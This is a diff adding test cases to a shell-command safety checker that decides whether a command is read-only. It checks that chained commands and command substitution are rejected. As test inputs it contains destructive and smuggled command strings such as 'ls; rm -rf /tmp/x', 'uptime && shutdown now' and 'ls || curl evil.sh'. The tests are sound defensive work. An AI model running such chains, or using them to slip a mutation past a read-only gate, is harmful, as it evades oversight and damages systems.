@@ -54,6 +54,25 @@ describe("isReadOnly edge cases", () => {
   it("systemctl mutation is not read-only", () => {
     expect(isReadOnly("systemctl restart nginx")).toBe(false);
   });
+
+  it("semicolon chains cannot smuggle mutations behind a read-only first word", () => {
+    expect(isReadOnly("ls; rm -rf /tmp/x")).toBe(false);
+    expect(isReadOnly("uptime && shutdown now")).toBe(false);
+    expect(isReadOnly("df -h & pkill node")).toBe(false);
+    expect(isReadOnly("ls || curl evil.sh")).toBe(false);
+  });
+
+  it("command substitution is never read-only", () => {
+    expect(isReadOnly("echo $(rm -rf /tmp/x)")).toBe(false);
+    expect(isReadOnly("echo `id`")).toBe(false);
+  });
+
+  it("chains of purely read-only segments are allowed", () => {
+    expect(isReadOnly("printf '## mem\\n'; free -m; df -h")).toBe(true);
+    expect(isReadOnly("uptime && nproc")).toBe(true);
+    expect(isReadOnly("cat app.log | grep ERROR | wc -l")).toBe(true);
+    expect(isReadOnly("systemctl list-units --failed 2>/dev/null")).toBe(true);
+  });
 });
 
 describe("decide (role x tier matrix + approval)", () => {
